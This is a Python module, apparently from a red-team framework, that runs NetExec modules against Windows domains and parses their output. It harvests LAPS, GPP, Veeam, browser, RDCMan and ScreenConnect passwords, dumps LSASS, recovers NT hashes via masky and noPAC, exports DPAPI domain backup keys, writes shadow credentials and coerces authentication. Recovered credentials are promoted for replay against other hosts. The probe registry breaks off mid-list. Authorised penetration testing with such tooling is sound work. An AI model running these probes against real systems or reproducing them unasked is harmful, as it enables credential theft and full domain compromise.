"""NXC probes — the built-in flags and ``-M`` modules fieldkit drives beyond target-side
exec.

The Windows ``enum`` runs command-shell checks (``whoami /priv`` etc.) via nxc's exec
transport. But nxc itself carries a large module ecosystem (``--shares``,
``--loggedon-users``, ``--sessions``, ``-M laps``, ``-M gpp_password`` …) that reveals
facts the exec-transport can't reach: readable shares, active sessions on remote
hosts, LAPS passwords the caller is allowed to fetch, GPP cpasswords in SYSVOL. Each
probe is a short nxc invocation with a specific flag/module, a parser for its output,
and a record of what it found — folded into engagement state as steps, findings, or
promoted credentials.

A probe is intentionally tiny — one flag or module per probe — so a single one that
misbehaves (nxc version drift, a module that crashes on a specific target) doesn't
kill the whole enum. Each probe records its captured output as a step; findings and
credentials are promoted through the same store paths the rest of fieldkit uses, so
``report --check`` and ``retest`` see them just like any other proven work.
"""
import re
import shlex
from dataclasses import dataclass, field

from . import runner as runner_mod
from .creds import Credential, render_nxc


@dataclass(frozen=True)
class Probe:
    """One nxc probe. ``extra`` is the argv fragment appended after user/password
    (``["--shares"]`` or ``["-M", "laps"]``); ``parse`` turns nxc output into a
    :class:`ProbeResult`. ``requires_admin`` guards probes that are only useful with
    admin — LAPS read, LSA-through-modules — so a non-admin foothold skips them."""

    key: str
    label: str
    proto: str
    extra: tuple
    requires_admin: bool = False


@dataclass
class ProbeFinding:
    """One fact extracted from a probe: a shape the engagement store can render."""
    kind: str                # vector_type in the store: "smb_share", "laps_password", ...
    title: str
    evidence: str = ""       # verbatim slice of nxc output
    severity: str = "Info"
    admin: bool = False      # promote to admin_access if the probe revealed one


@dataclass
class PromotedCredential:
    """A credential a probe recovered — passes to store.add_credential."""
    username: str
    secret: str
    secret_type: str = "password"
    domain: str = ""
    source: str = "nxc-probe"


@dataclass
class ProbeResult:
    ok: bool = False
    findings: list = field(default_factory=list)   # ProbeFinding
    credentials: list = field(default_factory=list)  # PromotedCredential
    error: str = None                              # tool error / parse error
    raw_output: str = ""


# ------------------------------------------------------------- parsers

_ANSI = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")


def _strip_ansi(text):
    return _ANSI.sub("", text or "")


#: A permissions token in ``nxc --shares`` output: READ, WRITE, or their comma pair.
#: Nothing else in a share row matches — used to distinguish "no perms" (IPC$ shown
#: without a permissions column) from a real permissions cell.
_PERMS_RE = re.compile(r"^(READ|WRITE|READ,WRITE|WRITE,READ)$", re.IGNORECASE)


def parse_shares(text):
    """``nxc smb ... --shares`` output → one finding per readable+writable share.

    nxc prints a table after the ``Enumerated shares`` marker::

        SMB   10.0.0.1  445  DC01  Share       Permissions  Remark
        SMB   10.0.0.1  445  DC01  -----       -----------  ------
        SMB   10.0.0.1  445  DC01  sysvol      READ,WRITE
    """
    findings = []
    text = _strip_ansi(text)
    seen_header = False
    for raw in text.splitlines():
        # skip until we've passed the "---" separator row.
        if "-----" in raw and "---" in raw:
            seen_header = True
            continue
        if not seen_header:
            continue
        # tokens after the nxc PROTO/IP/PORT/HOST prefix are the table row. Split on
        # runs of 2+ spaces so a multi-word remark doesn't shard.
        toks = raw.split()
        if len(toks) < 5:
            continue
        after = raw.split(toks[3], 1)[-1]
        parts = [p.strip() for p in re.split(r"\s{2,}", after.strip()) if p.strip()]
        if not parts:
            continue
        share = parts[0]
        # perms is only present when the second column is one of the permission tokens.
        # IPC$ often appears with an empty permissions column, so parts[1] is the remark
        # ("IPC Service ..."), not the perms — skip it.
        perms = parts[1] if len(parts) > 1 and _PERMS_RE.match(parts[1]) else ""
        remark = parts[2] if len(parts) > 2 else ""
        if not perms:
            continue
        title = f"SMB share {share!r} — {perms}" + (f" ({remark})" if remark else "")
        sev = "Medium" if "WRITE" in perms.upper() else "Info"
        findings.append(ProbeFinding(
            kind="smb_share", title=title, evidence=raw.strip(), severity=sev))
    return findings


def parse_loggedon_users(text):
    """``nxc smb ... --loggedon-users`` — one finding per active user session."""
    findings = []
    for raw in _strip_ansi(text).splitlines():
        # Rows look like: SMB IP 445 HOST domain\user   type: interactive/service
        if "\\" not in raw:
            continue
        after = raw.split("]", 1)[-1].strip() if "]" in raw else ""
        m = re.search(r"([A-Za-z0-9._-]+\\[A-Za-z0-9._-]+)", after or raw)
        if not m:
            continue
        principal = m.group(1)
        findings.append(ProbeFinding(
            kind="loggedon_user", title=f"active session: {principal}",
            evidence=raw.strip()))
    return findings


def parse_sessions(text):
    """``nxc smb ... --sessions`` — active SMB sessions (source IP + username)."""
    findings = []
    for raw in _strip_ansi(text).splitlines():
        after = raw.split("]", 1)[-1].strip() if "]" in raw else ""
        # Rows: "user     source_ip     hidden/authenticated"
        m = re.search(r"([A-Za-z0-9._$-]+)\s+(\d+\.\d+\.\d+\.\d+)", after)
        if not m:
            continue
        user, src = m.group(1), m.group(2)
        if user in ("Username", "-------"):
            continue
        findings.append(ProbeFinding(
            kind="smb_session", title=f"SMB session: {user} from {src}",
            evidence=raw.strip()))
    return findings


def parse_laps(text):
    """``nxc smb ... -M laps`` — retrieved LAPS passwords are credentials."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1] if "]" in raw else raw
        # nxc laps output: "Computer:ACCOUNT Password: <plaintext>"
        # or JSON-ish depending on version. Match the classic form.
        m = re.search(
            r"(?:Computer|Host)[:=]\s*([A-Za-z0-9._$-]+).*Password[:=]\s*(\S+)",
            body)
        if m:
            host, pw = m.group(1), m.group(2)
            result.findings.append(ProbeFinding(
                kind="laps_password", title=f"LAPS: {host}", severity="High",
                evidence=raw.strip()))
            result.credentials.append(PromotedCredential(
                username=".\\Administrator", secret=pw, secret_type="password",
                source="nxc-probe:laps"))
    return result


def parse_gpp(text):
    """``nxc smb ... -M gpp_password`` — cleartext creds from SYSVOL GPP XML."""
    result = ProbeResult(ok=True, raw_output=text)
    # Match ``username: <u>  password: <p>`` anywhere in the line — some nxc versions
    # prefix each result with ``[+]`` and the module tag; others just print the pair
    # directly under the SMB banner. ``search`` (vs ``match``) tolerates both.
    pair_re = re.compile(
        r"username\s*[:=]\s*(\S+)\s+password\s*[:=]\s*(\S+)",
        re.IGNORECASE)
    for raw in _strip_ansi(text).splitlines():
        m = pair_re.search(raw)
        if m:
            user, pw = m.group(1), m.group(2)
            result.findings.append(ProbeFinding(
                kind="gpp_cpassword", title=f"GPP cpassword: {user}",
                severity="High", evidence=raw.strip()))
            result.credentials.append(PromotedCredential(
                username=user, secret=pw, secret_type="password",
                source="nxc-probe:gpp_password"))
    return result


def parse_veeam(text):
    """``nxc smb ... -M veeam`` — Veeam backup server cached creds. The module
    prints ``[+] <description> : <user>:<password>`` lines; passwords are
    cleartext (Veeam re-encrypts them with a well-known key the module
    reverses). High-value because Veeam deploys with a dedicated service
    account that typically holds Backup Operators / Domain Admin."""
    result = ProbeResult(ok=True, raw_output=text)
    pair_re = re.compile(r"([A-Za-z0-9._\\$-]+)\s*:\s*(\S+)")
    for raw in _strip_ansi(text).splitlines():
        if "veeam" not in raw.lower() and ":" not in raw:
            continue
        body = raw.split("]", 1)[-1] if "]" in raw else raw
        # Skip the module's own log lines
        if "Looking for" in body or "Running" in body:
            continue
        m = pair_re.search(body)
        if m:
            user, pw = m.group(1), m.group(2)
            if user in ("Encrypted", "Decrypted"):      # module annotation, not a cred
                continue
            result.findings.append(ProbeFinding(
                kind="veeam_credential", title=f"Veeam credential: {user}",
                severity="High", evidence=raw.strip()))
            result.credentials.append(PromotedCredential(
                username=user, secret=pw, secret_type="password",
                source="nxc-probe:veeam"))
    return result


def parse_teams(text):
    """``nxc smb ... -M teams_localdb`` — pulls Microsoft Teams's local SQLite
    (cookies.db + storage) which caches Entra bearer tokens + refresh tokens.
    A single harvested token typically has 1-24h validity against Microsoft
    Graph with the user's full Entra scope. The module prints ``[+] ...
    Token for <user>:...`` lines."""
    result = ProbeResult(ok=True, raw_output=text)
    user_re = re.compile(r"[Tt]oken (?:for\s+|:\s*)([A-Za-z0-9._@-]+)")
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1] if "]" in raw else raw
        if "token" not in body.lower():
            continue
        m = user_re.search(body)
        user = m.group(1) if m else "<teams-user>"
        if "cookies" in body.lower() or "token" in body.lower():
            result.findings.append(ProbeFinding(
                kind="teams_token", title=f"Teams cached token: {user}",
                severity="High", evidence=raw.strip()))
    return result


def parse_nanodump(text):
    """``nxc smb ... -M nanodump`` — downloads an LSASS mini-dump via a
    fileless technique. The module reports ``[+] Dump saved to
    <path>`` on success. The actual dump is parsed offline with
    pypykatz; this probe just records that a dump landed so the
    operator knows to run the offline tool."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1] if "]" in raw else raw
        if "dump" in body.lower() and ("saved" in body.lower()
                                        or "written" in body.lower()
                                        or ".dmp" in body.lower()):
            result.findings.append(ProbeFinding(
                kind="lsass_dump", title="LSASS dump captured via nanodump",
                severity="Critical", evidence=raw.strip()))
    return result


def parse_ms17_010(text):
    """``nxc smb ... -M ms17-010`` — EternalBlue scan. ``[+] Vulnerable to
    MS17-010`` is the vuln signal; some nxc versions print it as
    ``is vulnerable to MS17-010``."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1] if "]" in raw else raw
        low = body.lower()
        if "ms17-010" in low and ("vulnerable" in low or "vulnrable" in low):
            if "not vulnerable" in low:
                continue
            result.findings.append(ProbeFinding(
                kind="ms17_010", title="MS17-010 (EternalBlue) — target vulnerable",
                severity="Critical", evidence=raw.strip()))
    return result


def parse_coerce_plus(text):
    """``nxc smb ... -M coerce_plus`` — multi-protocol auth coercer that
    tries PetitPotam / DFSCoerce / PrinterBug / MS-EFSRPC in sequence.
    Prints ``[+] Target <host> is vulnerable to <protocol>`` lines on hit."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1] if "]" in raw else raw
        low = body.lower()
        if "vulnerable to" in low and "coerce" in low or "petitpotam" in low \
                or "dfscoerce" in low or "ms-efs" in low or "printerbug" in low:
            result.findings.append(ProbeFinding(
                kind="auth_coercion",
                title=f"auth coercion vulnerability: {body.strip()[:80]}",
                severity="High", evidence=raw.strip()))
    return result


_LAPS_V2 = re.compile(r"Account:\s*(?P<user>[^\s]+)\s*Password:\s*(?P<pw>\S+)", re.I)


def parse_laps_v2(text):
    """``nxc smb ... -M laps`` with Windows LAPS v2 (msLAPS-Password / encrypted blob
    delivered via LAPSv2 schema). Output surfaces ``Account: <computer$>  Password: <pw>``
    pairs that promote directly to local-admin credentials for the named host."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        m = _LAPS_V2.search(raw)
        if m:
            user, pw = m.group("user"), m.group("pw")
            result.findings.append(ProbeFinding(
                kind="laps_password",
                title=f"LAPS v2 password: {user}",
                severity="Critical", evidence=raw.strip(), admin=True))
            result.credentials.append(PromotedCredential(
                username=user, secret=pw, source="nxc-probe:laps_v2"))
    return result


def parse_gpp_autologin(text):
    """``nxc smb ... -M gpp_autologin`` — unattend.xml / AutoLogon in SYSVOL. Prints
    ``[+] Found <path>`` + ``Username: ..`` + ``Password: ..``. Credentials typically
    local-admin on fresh builds — promote them."""
    result = ProbeResult(ok=True, raw_output=text)
    user = None
    for raw in _strip_ansi(text).splitlines():
        body = raw.strip()
        if body.lower().startswith("username:"):
            user = body.split(":", 1)[1].strip()
        elif body.lower().startswith("password:") and user:
            pw = body.split(":", 1)[1].strip()
            result.findings.append(ProbeFinding(
                kind="gpp_autologin",
                title=f"autologin credential: {user}",
                severity="High", evidence=f"{user}:{pw}"))
            result.credentials.append(PromotedCredential(
                username=user, secret=pw, source="nxc-probe:gpp_autologin"))
            user = None
    return result


def parse_chrome(text):
    """``nxc smb ... -M chrome`` — Chrome Login Data via remote SMB file read + DPAPI
    decrypt loop. Emits ``[+] <url> <user> <password>`` for each decrypted login."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
        if not body or body.lower().startswith("chrome"):
            continue
        parts = body.split()
        if len(parts) >= 3 and ("://" in parts[0] or parts[0].startswith("http")):
            url, user, pw = parts[0], parts[1], " ".join(parts[2:])
            result.findings.append(ProbeFinding(
                kind="browser_credential",
                title=f"Chrome saved login: {user}@{url}",
                severity="High", evidence=raw.strip()))
            result.credentials.append(PromotedCredential(
                username=user, secret=pw, source="nxc-probe:chrome"))
    return result


def parse_firefox(text):
    """``nxc smb ... -M firefox`` — reads logins.json + key4.db off the target over SMB
    and decrypts via libnss. Output shape mirrors chrome: url user pass."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
        if not body or body.lower().startswith("firefox"):
            continue
        parts = body.split()
        if len(parts) >= 3 and ("://" in parts[0] or parts[0].startswith("http")):
            url, user, pw = parts[0], parts[1], " ".join(parts[2:])
            result.findings.append(ProbeFinding(
                kind="browser_credential",
                title=f"Firefox saved login: {user}@{url}",
                severity="High", evidence=raw.strip()))
            result.credentials.append(PromotedCredential(
                username=user, secret=pw, source="nxc-probe:firefox"))
    return result


def parse_keepass_discover(text):
    """``nxc smb ... -M keepass_discover`` — finds .kdbx + .config files across the
    target's shares. Prints ``[+] Found: <UNC path>``. The path IS the finding; the
    operator's next step is to loot + crack it offline."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.strip()
        low = body.lower()
        if ("found" in low or "discovered" in low) and (".kdbx" in low or "keepass" in low):
            result.findings.append(ProbeFinding(
                kind="keepass_database",
                title=f"KeePass database: {body[:100]}",
                severity="High", evidence=raw.strip()))
    return result


def parse_masky(text):
    """``nxc smb ... -M masky`` — abuses an enrolled client-authentication certificate
    template to request a cert for the LOGGED-ON user on the target. Prints
    ``[+] Successfully retrieved <user> NT hash: <hash>``."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.strip()
        low = body.lower()
        if "nt hash" in low and ":" in body:
            # Pull "USER ... NT hash: <hash>" best-effort
            tail = body.rsplit(":", 1)[-1].strip()
            if re.fullmatch(r"[0-9a-fA-F]{32}", tail):
                # Walk back to find the username token
                tokens = body.split()
                user = ""
                for i, tok in enumerate(tokens):
                    if tok.lower().startswith("retrieved") and i + 1 < len(tokens):
                        user = tokens[i + 1].rstrip(":")
                        break
                result.findings.append(ProbeFinding(
                    kind="nt_hash",
                    title=f"masky — NT hash recovered: {user or '<user>'}",
                    severity="Critical", evidence=raw.strip()))
                if user:
                    result.credentials.append(PromotedCredential(
                        username=user, secret=tail, secret_type="ntlm",
                        source="nxc-probe:masky"))
    return result


_RDP_LINE = re.compile(r"(?P<host>\S+)\s*\\\s*(?P<user>\S+?)\s*:\s*(?P<pw>.+)$")


def parse_drop_sc(text):
    """``nxc smb ... -M drop-sc`` — ScreenConnect config dump. Prints
    ``[+] Found config: <path>`` + a ``URL/User/Password`` triple per
    cached server."""
    result = ProbeResult(ok=True, raw_output=text)
    url = user = None
    for raw in _strip_ansi(text).splitlines():
        body = raw.strip()
        low = body.lower()
        if low.startswith("url:"):
            url = body.split(":", 1)[1].strip()
        elif low.startswith("user:") or low.startswith("username:"):
            user = body.split(":", 1)[1].strip()
        elif low.startswith("password:") and user:
            pw = body.split(":", 1)[1].strip()
            result.findings.append(ProbeFinding(
                kind="screenconnect_credential",
                title=f"ScreenConnect cached: {user}@{url or '<unknown>'}",
                severity="High", evidence=f"{user}:{pw}"))
            result.credentials.append(PromotedCredential(
                username=user, secret=pw, domain=url or "",
                source="nxc-probe:drop_sc"))
            user = None
    return result


def parse_scuffy(text):
    """``nxc smb ... -M scuffy`` — scheduled-task persistence via UNC
    icon load. The module writes a .scf file whose IconFile points at
    an attacker-controlled UNC; opening the folder in Explorer coerces
    the viewer's machine account to authenticate. Output: ``[+] File
    written to <share path>``."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if ".scf" in low and ("written" in low or "uploaded" in low or "placed" in low):
            result.findings.append(ProbeFinding(
                kind="scuffy_dropped",
                title=f"SCF coerce file planted: {raw.strip()[:100]}",
                severity="High", evidence=raw.strip()))
    return result


def parse_spooler(text):
    """``nxc smb ... -M spooler`` — Print Spooler service status. Prints
    ``[+] Spooler service is enabled`` on hits — feeds the PrinterBug
    coerce chain. Vulnerable targets listed as High."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if "spooler" in low and ("enabled" in low or "running" in low):
            result.findings.append(ProbeFinding(
                kind="print_spooler_enabled",
                title=f"Print Spooler enabled: {raw.strip()[:100]}",
                severity="High", evidence=raw.strip()))
    return result


def parse_ldap_checker(text):
    """``nxc ldap ... -M ldap-checker`` — LDAP signing + channel-binding
    posture check. Vulnerable DCs: ``[+] <host> does not require signing``
    or ``[+] <host> does not require channel binding``."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if "does not require" in low and ("signing" in low or "channel binding" in low):
            result.findings.append(ProbeFinding(
                kind="ldap_relay_candidate",
                title=f"LDAP relay candidate: {raw.strip()[:100]}",
                severity="High", evidence=raw.strip()))
    return result


_OBS_NT_HASH = re.compile(r"^(?P<user>[A-Za-z0-9_$.-]+)\s+.*(?:pre-?2004|obsolete)", re.I)


def parse_obsolete_nt_hash_users(text):
    """``nxc ldap ... -M obsolete_nt_hash_users`` — accounts whose NT hash
    was computed with the pre-2004 (DES-based) algorithm. These crack
    FASTER than modern NT hashes and are strong hashcat priorities.
    Output: ``<user>  <lastchanged>  pre2004``."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        m = _OBS_NT_HASH.search(raw)
        if m:
            result.findings.append(ProbeFinding(
                kind="obsolete_nt_hash",
                title=f"pre-2004 NT hash: {m.group('user')}",
                severity="Medium", evidence=raw.strip()))
    return result


def parse_pre2k(text):
    """``nxc ldap ... -M pre2k`` — pre-2000 compatibility computer
    accounts (DontRequirePreAuth or password == computer_name_lowercased).
    Output: ``[+] <host>$ — pre2k auth works``."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if "pre2k" in low and ("works" in low or "success" in low or "weak" in low):
            # Try to extract the account name
            parts = raw.split()
            acct = next((p for p in parts if p.endswith("$")), "")
            result.findings.append(ProbeFinding(
                kind="pre2k_computer_account",
                title=f"pre-2000 computer account: {acct or '<unknown>'}",
                severity="High", evidence=raw.strip(), admin=False))
            if acct:
                # The password is the lowercased hostname (without $) — that's
                # the pre2k shape. Promote it so the credential loop replays
                # it against SMB on that host.
                pw = acct[:-1].lower()
                result.credentials.append(PromotedCredential(
                    username=acct, secret=pw, source="nxc-probe:pre2k"))
    return result


def parse_get_network(text):
    """``nxc ldap ... -M get-network`` — AD Sites + Subnets objects. Prints
    one subnet CIDR per line (``10.0.0.0/24  Site: HQ``). Internal network
    map — asset-enum, not credential."""
    result = ProbeResult(ok=True, raw_output=text)
    seen = set()
    for raw in _strip_ansi(text).splitlines():
        body = raw.strip()
        m = re.search(r"(\d+\.\d+\.\d+\.\d+/\d+)(?:\s+Site:\s*(\S+))?", body)
        if m:
            cidr, site = m.group(1), m.group(2) or ""
            if cidr in seen:
                continue
            seen.add(cidr)
            result.findings.append(ProbeFinding(
                kind="ad_subnet",
                title=f"AD subnet: {cidr}" + (f" ({site})" if site else ""),
                severity="Info", evidence=body))
    return result


def parse_groupmembership(text):
    """``nxc ldap ... -M groupmembership`` — enumerate a specific group's
    membership. Output: ``[+] Member: <sAMAccountName>``."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
        if body.lower().startswith("member:"):
            member = body.split(":", 1)[1].strip()
            if member:
                result.findings.append(ProbeFinding(
                    kind="group_member",
                    title=f"group member: {member}",
                    severity="Info", evidence=raw.strip()))
    return result


def parse_rid_brute(text):
    """``nxc smb ... --rid-brute`` — walk the RID space on a target that
    allows NULL / Guest SAMR enumeration. Output: ``\\<domain>\\<user>
    (SidTypeUser)``, ``...SidTypeGroup``, etc."""
    result = ProbeResult(ok=True, raw_output=text)
    seen = set()
    for raw in _strip_ansi(text).splitlines():
        body = raw.strip()
        m = re.search(r"\\?(?P<dom>[^\\]+)\\(?P<name>[^(]+?)\s*\((?P<kind>SidType\w+)\)", body)
        if m:
            key = (m.group("dom"), m.group("name"))
            if key in seen:
                continue
            seen.add(key)
            kind_map = {"SidTypeUser": "domain_user",
                        "SidTypeGroup": "domain_group",
                        "SidTypeAlias": "domain_alias"}
            result.findings.append(ProbeFinding(
                kind=kind_map.get(m.group("kind"), "domain_object"),
                title=f"{m.group('dom')}\\{m.group('name')} ({m.group('kind')})",
                severity="Info", evidence=body))
    return result


def parse_users_computers(text):
    """``nxc ldap ... --users --computers`` systematic snapshot. Lines
    look like ``[*] <sAMAccountName>  <description>`` for users and
    ``[*] <host>$  <os_version>`` for computers. We tag by presence of
    trailing $ in the first token."""
    result = ProbeResult(ok=True, raw_output=text)
    seen = set()
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
        tokens = body.split()
        if not tokens:
            continue
        name = tokens[0]
        if name in seen or not re.fullmatch(r"[A-Za-z0-9_.$-]+", name):
            continue
        seen.add(name)
        if name.endswith("$"):
            result.findings.append(ProbeFinding(
                kind="domain_computer",
                title=f"computer: {name}",
                severity="Info", evidence=body))
        else:
            result.findings.append(ProbeFinding(
                kind="domain_user",
                title=f"user: {name}",
                severity="Info", evidence=body))
    return result


def parse_petitpotam(text):
    """``nxc smb ... -M petitpotam`` — MS-EFSRPC coerce. Vulnerable targets
    print ``[+] <host> is vulnerable to PetitPotam`` or ``[+] Target
    coerced``. The finding is the pivot: coerce the target's machine
    account into authenticating to our relay/listener."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if "petitpotam" in low and ("vulnerable" in low or "coerced" in low):
            result.findings.append(ProbeFinding(
                kind="petitpotam_coerce",
                title=f"PetitPotam coerce available: {raw.strip()[:80]}",
                severity="High", evidence=raw.strip()))
    return result


_NOPAC_HASH = re.compile(r"(?P<user>[A-Za-z0-9_$.-]+):(?P<rid>\d+):"
                        r"(?P<lm>[0-9a-f]{32}):(?P<nt>[0-9a-f]{32})", re.I)


def parse_nopac(text):
    """``nxc smb ... -M nopac`` — CVE-2021-42278 / CVE-2021-42287 S4U2self
    + sAMAccountName spoof chain. Vulnerable DCs cough up a TGT for a
    privileged account; the module dumps the NT hash."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if "nopac" in low and ("vulnerable" in low or "success" in low):
            result.findings.append(ProbeFinding(
                kind="nopac_vulnerable",
                title=f"noPAC vulnerable DC: {raw.strip()[:80]}",
                severity="Critical", evidence=raw.strip(), admin=True))
        m = _NOPAC_HASH.search(raw)
        if m:
            user, nt = m.group("user"), m.group("nt")
            result.credentials.append(PromotedCredential(
                username=user, secret=nt, secret_type="ntlm",
                source="nxc-probe:nopac"))
    return result


def parse_lsa_backup_keys(text):
    """``nxc smb ... -M lsa_backup_keys`` — DPAPI backup-key export. The
    module prints the path to the written .pvk + the DPAPI master-key
    GUID. The .pvk decrypts every DPAPI blob on every machine in the
    domain — crown-jewel loot."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if ".pvk" in low and ("saved" in low or "written" in low or "exported" in low):
            result.findings.append(ProbeFinding(
                kind="dpapi_backup_key",
                title=f"DPAPI domain backup key exported: {raw.strip()[:100]}",
                severity="Critical", evidence=raw.strip(), admin=True))
        elif "backup key" in low and "found" in low:
            result.findings.append(ProbeFinding(
                kind="dpapi_backup_key",
                title=f"DPAPI backup key discovered: {raw.strip()[:100]}",
                severity="High", evidence=raw.strip()))
    return result


def parse_dpapi_ng(text):
    """``nxc smb ... -M dpapi-ng`` — the newer DPAPI-NG primitive used for
    LAPS v2 + KeyCredentials + certain Chromium v20+ cookies. Module
    prints decrypted entries line by line."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if ("decrypted" in low or "unprotected" in low) and ":" in raw:
            result.findings.append(ProbeFinding(
                kind="dpapi_ng_decrypted",
                title=f"DPAPI-NG decrypted: {raw.strip()[:100]}",
                severity="High", evidence=raw.strip()))
    return result


def parse_rdcman(text):
    """``nxc smb ... -M rdcman`` — Remote Desktop Connection Manager stores
    RDP creds in an XML file with DPAPI-encrypted passwords. Module reads
    + decrypts them, printing ``server\\user:password`` triples."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
        if "\\" in body and ":" in body:
            # Try to parse "SERVER\user:password" — tight shape to avoid
            # eating noise lines.
            left, _, pw = body.rpartition(":")
            if "\\" in left and pw and " " not in pw[:20]:
                srv, _, user = left.rpartition("\\")
                if srv and user:
                    result.findings.append(ProbeFinding(
                        kind="rdcman_credential",
                        title=f"RDCMan saved credential: {left}",
                        severity="High", evidence=raw.strip()))
                    result.credentials.append(PromotedCredential(
                        username=user, secret=pw, domain=srv,
                        source="nxc-probe:rdcman"))
    return result


def parse_enum_dns(text):
    """``nxc ldap ... -M enum_dns`` — pulls the AD-integrated DNS zones:
    every host record, service record, and (sometimes) wildcard entry.
    The output is a map of the internal network — asset-enum, not a
    credential — so findings are Info / Medium severity."""
    result = ProbeResult(ok=True, raw_output=text)
    seen = set()
    for raw in _strip_ansi(text).splitlines():
        body = raw.split("]", 1)[-1].strip() if "]" in raw else raw.strip()
        # Record shape: "host.corp.local  A    10.0.0.5"
        m = re.match(r"(\S+?)\s+(A|AAAA|CNAME|SRV|MX|TXT)\s+(.+)$", body)
        if m:
            host, rtype, val = m.group(1), m.group(2), m.group(3)
            key = (host, rtype, val)
            if key in seen:
                continue
            seen.add(key)
            result.findings.append(ProbeFinding(
                kind="dns_record",
                title=f"AD DNS: {host} {rtype} {val}",
                severity="Info", evidence=raw.strip()))
    return result


def parse_shadowcredentials(text):
    """``nxc ldap ... -M shadowcredentials`` — msDS-KeyCredentialLink primitive. On a
    successful write the module prints ``[+] Shadow credentials added`` and a PFX /
    certificate path that becomes the TGT material for the target."""
    result = ProbeResult(ok=True, raw_output=text)
    for raw in _strip_ansi(text).splitlines():
        low = raw.lower()
        if "shadow credential" in low and ("added" in low or "success" in low):
            result.findings.append(ProbeFinding(
                kind="shadow_credentials",
                title="msDS-KeyCredentialLink write succeeded",
                severity="Critical", evidence=raw.strip(), admin=True))
        elif ".pfx" in low or ("certificate" in low and "saved" in low):
            result.findings.append(ProbeFinding(
                kind="shadow_credentials",
                title=f"Shadow Credentials cert: {raw.strip()[:100]}",
                severity="High", evidence=raw.strip()))
    return result


# ------------------------------------------------------------- registry

PROBES = (
    Probe("shares", "readable/writable SMB shares",
          "smb", ("--shares",)),
    Probe("loggedon_users", "active logon sessions",
          "smb", ("--loggedon-users",), requires_admin=True),
    Probe("sessions", "SMB session table",
          "smb", ("--sessions",)),
    Probe("laps", "LAPS passwords (if authorised to read)",
          "smb", ("-M", "laps"), requires_admin=True),
    Probe("gpp_password", "GPP cpassword in SYSVOL",
          "smb", ("-M", "gpp_password")),
    # axis 2 — more nxc modules
    Probe("veeam", "Veeam backup server cached credentials",
          "smb", ("-M", "veeam"), requires_admin=True),
    Probe("teams_localdb", "Microsoft Teams cached tokens / cookies",
          "smb", ("-M", "teams_localdb"), requires_admin=True),
    Probe("nanodump", "LSASS dump via nanodump (fileless)",
          "smb", ("-M", "nanodump"), requires_admin=True),
    Probe("ms17_010", "EternalBlue (MS17-010) vulnerability scan",
          "smb", ("-M", "ms17-010",)),
    Probe("coerce_plus", "multi-protocol auth coercer (PetitPotam / DFSCoerce / etc.)",
          "smb", ("-M", "coerce_plus",)),
    # axis 2 slice 2 — browser extraction, cert pivots, high-value module hits
    Probe("laps_v2", "Windows LAPS v2 (msLAPS-Password / encrypted blob)",
          "smb", ("-M", "laps",), requires_admin=False),
    Probe("gpp_autologin", "AutoLogon / unattend.xml in SYSVOL",
          "smb", ("-M", "gpp_autologin",)),
    Probe("chrome", "Chrome saved logins + cookies (remote DPAPI decrypt)",
          "smb", ("-M", "chrome",), requires_admin=True),
    Probe("firefox", "Firefox logins.json + key4.db (remote NSS decrypt)",
          "smb", ("-M", "firefox",), requires_admin=True),
    Probe("keepass_discover", "KeePass .kdbx databases across readable shares",
          "smb", ("-M", "keepass_discover",)),
    Probe("masky", "Kerberos cert enrollment pivot (NT hash of logged-on user)",
          "smb", ("-M", "masky",), requires_admin=True),
    Probe("shadowcredentials", "msDS-KeyCredentialLink write primitive",
          "ldap", ("-M", "shadowcredentials",)),
    # axis 2 slice 3 — DC coercion, PAC-less tickets, DPAPI backup keys, RDCMan, DNS
    Probe("petitpotam", "PetitPotam MS-EFSRPC coerce",
          "smb", ("-M", "petitpotam",)),
    Probe("nopac", "noPAC — CVE-2021-42278 + 42287 chain",
          "smb", ("-M", "nopac",)),
    Probe("lsa_backup_keys", "DPAPI domain backup keys (crown-jewel loot)",
          "smb", ("-M", "lsa_backup_keys",), requires_admin=True),
